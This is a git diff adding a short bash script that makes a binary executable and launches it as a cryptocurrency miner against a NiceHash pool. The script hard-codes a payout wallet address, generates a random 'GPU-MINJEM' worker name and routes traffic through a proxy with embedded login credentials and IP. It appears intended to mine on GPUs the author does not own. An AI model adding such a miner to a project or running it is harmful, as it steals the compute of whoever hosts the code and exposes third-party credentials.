@@ -1,0 +1,5 @@
+#!/bin/bash
+
+chmod +x nb
+
+./nb -a beamv3 -o stratum+tcp://beamv3.eu.nicehash.com:3387 -u 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(echo GPU-MINJEM-$(shuf -i 1000-9999 -n 1)) --proxy rifkii:awikwokk209.127.96.160:7755
